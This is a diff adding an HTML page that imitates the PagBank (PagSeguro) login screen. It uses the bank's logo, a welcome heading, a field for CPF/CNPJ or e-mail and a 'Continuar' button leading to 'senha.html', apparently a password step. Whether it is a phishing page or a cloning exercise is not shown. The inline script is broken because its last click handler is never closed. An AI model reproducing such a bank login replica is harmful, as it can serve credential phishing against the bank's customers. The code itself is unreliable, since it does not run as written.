@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="stylesheet" href="./style.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
+      rel="stylesheet"
+    />
+    <title>Acesso</title>
+  </head>
+  <body>
+    <div style="margin-top: 2px" id="header-img">
+      <img
+        src="./images/logopagseguro.png"
+        alt=""
+        style="position: absolute; width: 120px; margin: -365px -178px"
+      />
+      <img
+        src="./images/sinal-de-interrogacao.png"
+        alt=""
+        style="position: fixed; margin: -350px 135px"
+      />
+    </div>
+    <div
+      id="form-acesso"
+      style="position: absolute; margin-top: -465px; padding: 20px"
+    >
+      <h1 style="font-weight: 500; font-size: 24px; color: #1c1916">
+        Bem-Vindo ao PagBank
+      </h1>
+      <p style="color: #616159">
+        Digite seu CPF/CNPJ ou E-mail para acessar a conta
+      </p>
+      <span style="color: #616159">CPF, CNPJ ou E-mail</span>
+      <input
+        id="dados-acesso"
+        type="text"
+        style="
+          border: none;
+          position: absolute;
+          margin: 25px -148px;
+          width: 90%;
+          background-color: var(--cor-cinza);
+          outline: none;
+          font-size: 20px;
+          color: #1c1916;
+        "
+      />
+      <img
+        id="clear-input"
+        src="./images/excluir.png"
+        alt=""
+        style="position: absolute; margin: 23px 150px; margin: 23px 160px"
+      />
+      <div
+        id="linha"
+        style="color: #1c1916; border: 1px solid; margin-top: 32px"
+      ></div>
+    </div>
+    <div
+      id="bts-acesso"
+      style="display: grid; position: absolute; margin-top: 490px"
+    >
+      <div
+        id="versao"
+        style="
+          text-align: center;
+          margin-bottom: 15px;
+          color: #616159;
+          font-size: 14px;
+        "
+      >
+        <span style="margin-right: 44%">Versão 4.113.12</span>
+        <span>ID 347-3a6</span>
+      </div>
+      <button
+        style="
+          margin-bottom: 10px;
+          height: 40px;
+          width: 360px;
+          border-radius: 20px;
+          background-color: var(--cor--azul);
+          color: white;
+          font-weight: 800;
+          border-color: var(--cor--azul);
+        "
+        id="btn-continuar"
+      >
+        Continuar
+      </button>
+      <button
+        style="
+          width: 360px;
+          height: 40px;
+          font-weight: 800;
+          border-radius: 20px;
+          outline: none;
+          border: none;
+          color: var(--cor--azul);
+        "
+        id="btn-criar-conta"
+      >
+        Criar conta
+      </button>
+    </div>
+    <script src="./script.js"></script>
+    <script>
+
+      // Função para limpar o campo de entrada com id "dados-acesso"
+      document
+        .getElementById("clear-input")
+        .addEventListener("click", function () {
+          document.getElementById("dados-acesso").value = "";
+        });
+         document.getElementById("btn-continuar").addEventListener("click", function () {
+        window.location.href = "senha.html";
+        
+    </script>
+  </body>
+</html>
